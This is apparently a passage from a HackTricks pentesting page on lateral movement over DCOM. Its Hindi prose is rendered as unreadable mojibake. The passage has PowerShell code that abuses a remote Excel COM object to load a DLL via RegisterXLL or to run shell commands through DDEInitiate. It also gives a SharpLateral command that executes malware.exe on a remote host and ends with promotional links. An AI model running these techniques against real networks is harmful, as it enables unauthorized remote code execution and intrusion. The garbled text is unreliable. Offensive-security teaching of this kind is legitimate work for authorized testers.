## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг

* Powershell рд╕реНрдХреНрд░рд┐рдкреНрдЯ [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) рдЕрдиреНрдп рдорд╢реАрдиреЛрдВ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд╕рднреА рдЯрд┐рдкреНрдкрдгреА рдХрд┐рдП рдЧрдП рддрд░реАрдХреЛрдВ рдХреЛ рдЖрд╕рд╛рдиреА рд╕реЗ рдЖрдордВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред
* рдЖрдк [**SharpLateral**](https://github.com/mertdas/SharpLateral) рдХрд╛ рднреА рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## рд╕рдВрджрд░реНрдн

* рдкрд╣рд▓реА рд╡рд┐рдзрд┐ рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) рд╕реЗ рд▓реА рдЧрдИ рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ
* рджреВрд╕рд░реЗ рдЦрдВрдб рдХреА рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) рд╕реЗ рд▓реА рдЧрдИ рд╣реИ, рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВ

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рдЙрди рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ рдЬреЛ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред Intruder рдЖрдкрдХреА рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХреЛ рдЯреНрд░реИрдХ рдХрд░рддрд╛ рд╣реИ, рд╕рдХреНрд░рд┐рдп рдЦрддрд░реЗ рдХреЗ рд╕реНрдХреИрди рдЪрд▓рд╛рддрд╛ рд╣реИ, рдЖрдкрдХреЗ рдкреВрд░реЗ рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ рдореЗрдВ рдореБрджреНрджреЛрдВ рдХреЛ рдвреВрдВрдврддрд╛ рд╣реИ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХред рдЖрдЬ рд╣реА [**рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЬрд╛рдП**? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рддрдХ рдкрд╣реБрдВрдЪ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ**? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
